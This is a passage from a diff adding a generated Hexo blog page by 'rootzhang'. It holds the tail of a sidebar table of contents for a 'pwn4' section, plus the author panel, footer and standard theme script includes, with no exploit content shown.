class="nav-text">pwn4</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">rootzhang</p>
+  <div class="site-description" itemprop="description">我的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rootzhang</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
